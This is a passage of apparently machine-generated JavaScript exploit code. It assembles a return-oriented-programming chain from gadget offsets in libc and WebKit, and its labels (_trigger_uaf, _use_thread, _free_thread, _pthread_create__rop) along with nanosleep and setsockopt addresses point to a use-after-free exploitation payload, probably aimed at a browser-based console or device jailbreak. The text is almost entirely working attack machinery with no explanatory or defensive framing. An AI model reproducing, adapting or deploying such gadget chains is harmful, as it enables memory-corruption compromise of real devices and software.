ropchain+220520,//L3495
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+220128,//L3503
webkit_base+4687784,
libc_base+768796
]);
//L3501:
db([0,0]);
set_gadget(libc_base+165442,);
//L3502:
db([0,0]);
set_gadget(libc_base+772328,);
//L3503:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+220288,//L3505
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+220320,//L3507
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+220272,//L3504
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+220304,//L3506
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3504:
db([0,0]);
set_gadget(libc_base+165442,);
//L3505:
db([0,0]);
set_gadget(libc_base+772328,);
//L3506:
db([0,0]);
set_gadget(libc_base+768796,);
//L3507:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+220400,//L3508
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+220416,//L3509
webkit_base+4687784,
libc_base+165442
]);
//L3508:
db([0,0]);
set_gadget(libc_base+768796,);
//L3509:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+220512,//L3511
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+220496,//L3510
webkit_base+4687784,
libc_base+165442
]);
//L3510:
db([0,0]);
set_gadget(libc_base+768796,);
//L3511:
db([0,0]);
//L3495:
set_gadget(libc_base+768796,);
//L3512:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3514:
ropchain+603808,//L3513
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3516:
ropchain+220680,//L3515
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+222264,//L3517
//L3515:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+220744,//L3518
//L3460:
libc_base+489696,//pop rsp
ropchain+220760,//L3519
//L3518:
libc_base+489696,//pop rsp
ropchain+215304,//L3386
//L3519:
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+220816,//L3521
webkit_base+4687784,
libc_base+768796
]);
//L3520:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3521:
db([0,0]);
set_gadget(libc_base+165442,);
//L3522:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+220928,//L3524
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+220912,//L3523
webkit_base+4687784,
libc_base+165442
]);
//L3523:
db([0,0]);
set_gadget(libc_base+768796,);
//L3524:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+221024,//L3527
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3525:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3527:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+221112,//L3529
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+221128,//L3530
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3529:
db([0,0]);
set_gadget(libc_base+772328,);
//L3530:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+221232,//L3533
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+221216,//L3532
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3532:
db([0,0]);
set_gadget(libc_base+772328,);
//L3533:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+221288,//L3535
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3535:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+221392,//L3537
webkit_base+4687784,
libc_base+768796
]);
//L3536:
db([1,0]);// 0x1
set_gadget(webkit_base+3789839,);//pop r11
//L3537:
db([0,0]);
set_gadget(libc_base+165442,);
//L3538:
db([1,0]);// 0x1
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+221504,//L3540
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+221488,//L3539
webkit_base+4687784,
libc_base+165442
]);
//L3539:
db([0,0]);
set_gadget(libc_base+768796,);
//L3540:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+221600,//L3543
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3541:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L3543:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+221688,//L3545
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+221704,//L3546
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3545:
db([0,0]);
set_gadget(libc_base+772328,);
//L3546:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+221808,//L3549
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+221792,//L3548
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3548:
db([0,0]);
set_gadget(libc_base+772328,);
//L3549:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+221880,//L3552
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3550:
db([12,0]);// 0xc
set_gadget(libc_base+772328,);
//L3552:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+222016,//L3554
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+222000,//L3553
webkit_base+4687784,
libc_base+165442
]);
//L3553:
db([0,0]);
set_gadget(libc_base+768796,);
//L3554:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+222120,//L3555
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+222136,//L3556
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L3555:
db([0,0]);
set_gadget(libc_base+768796,);
//L3556:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+222256,//L3557
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+222240,//L3558
webkit_base+4687784,
libc_base+768796
]);
//L3558:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L3557:
db([0,0]);
//L3517:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
nanosleep_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+223584,//L3559
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L3559:
db([0,0]);
//L3491:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+224912,//L3560
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L3560:
db([0,0]);
//_trigger_uaf:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+224984,//L3562
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3562:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+225048,//L3564
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L3564:
db([0,0]);
set_gadget(libc_base+713278,);
db([1032,0]);// 0x408
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+225136,//L3566
webkit_base+4687784,
libc_base+768796
]);
//L3565:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L3566:
db([0,0]);
set_gadget(libc_base+165442,);
//L3567:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+225248,//L3569
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+225232,//L3568
webkit_base+4687784,
libc_base+165442
]);
//L3568:
db([0,0]);
set_gadget(libc_base+768796,);
//L3569:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+225344,//L3572
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3570:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3572:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+225432,//L3574
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+225448,//L3575
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3574:
db([0,0]);
set_gadget(libc_base+772328,);
//L3575:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+225552,//L3578
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+225536,//L3577
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3577:
db([0,0]);
set_gadget(libc_base+772328,);
//L3578:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+225624,//L3581
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3579:
db([12,0]);// 0xc
set_gadget(libc_base+772328,);
//L3581:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+225792,//L3583
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+225808,//L3584
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+225776,//L3582
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3582:
db([0,0]);
set_gadget(libc_base+165442,);
//L3583:
db([0,0]);
set_gadget(libc_base+768796,);
//L3584:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+225904,//L3586
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+225888,//L3585
webkit_base+4687784,
libc_base+165442
]);
//L3585:
db([0,0]);
set_gadget(libc_base+768796,);
//L3586:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+226000,//L3589
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3587:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3589:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+226088,//L3591
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+226104,//L3592
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3591:
db([0,0]);
set_gadget(libc_base+772328,);
//L3592:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+226208,//L3595
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+226192,//L3594
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3594:
db([0,0]);
set_gadget(libc_base+772328,);
//L3595:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+226280,//L3598
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3596:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L3598:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+226448,//L3600
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+226464,//L3601
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+226432,//L3599
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3599:
db([0,0]);
set_gadget(libc_base+165442,);
//L3600:
db([0,0]);
set_gadget(libc_base+768796,);
//L3601:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+226560,//L3603
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+226544,//L3602
webkit_base+4687784,
libc_base+165442
]);
//L3602:
db([0,0]);
set_gadget(libc_base+768796,);
//L3603:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+226656,//L3606
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3604:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3606:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+226744,//L3608
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+226760,//L3609
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3608:
db([0,0]);
set_gadget(libc_base+772328,);
//L3609:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+226864,//L3612
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+226848,//L3611
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3611:
db([0,0]);
set_gadget(libc_base+772328,);
//L3612:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+226936,//L3615
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L3613:
db([4,0]);// 0x4
set_gadget(libc_base+772328,);
//L3615:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+227104,//L3617
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+227120,//L3618
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+227088,//L3616
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L3616:
db([0,0]);
set_gadget(libc_base+165442,);
//L3617:
db([0,0]);
set_gadget(libc_base+768796,);
//L3618:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+227216,//L3620
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+227200,//L3619
webkit_base+4687784,
libc_base+165442
]);
//L3619:
db([0,0]);
set_gadget(libc_base+768796,);
//L3620:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+227312,//L3623
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3621:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3623:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+227400,//L3625
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+227416,//L3626
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3625:
db([0,0]);
set_gadget(libc_base+772328,);
//L3626:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+227520,//L3629
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+227504,//L3628
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L3628:
db([0,0]);
set_gadget(libc_base+772328,);
//L3629:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+227576,//L3631
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L3631:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+227680,//L3634
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3632:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3634:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+227768,//L3636
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+227784,//L3637
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3636:
db([0,0]);
set_gadget(libc_base+772328,);
//L3637:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+227928,//L3640
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+227896,//L3638
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+227912,//L3639
webkit_base+4687784,
libc_base+165442
]);
//L3638:
db([0,0]);
set_gadget(libc_base+772328,);
//L3639:
db([0,0]);
set_gadget(libc_base+768796,);
//L3640:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3641:
ropchain+200952,//_use_thread
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L3642:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+228120,//L3644
webkit_base+4687784,
libc_base+713278
]);
//L3643:
db([4294966272,4294967295]);// -0x400
set_gadget(libc_base+768796,);
//L3644:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3646:
ropchain+228232,//L3645
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+148944,//_pthread_create__rop
//L3645:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+228320,//L3649
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L3647:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L3649:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+228408,//L3651
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+228424,//L3652
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L3651:
db([0,0]);
set_gadget(libc_base+772328,);
//L3652:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+228568,//L3655
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+228536,//L3653
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+228552,//L3654
webkit_base+4687784,
libc_base+165442
]);
//L3653:
db([0,0]);
set_gadget(libc_base+772328,);
//L3654:
db([0,0]);
set_gadget(libc_base+768796,);
//L3655:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L3656:
ropchain+214816,//_free_thread
libc_base+713278
]);
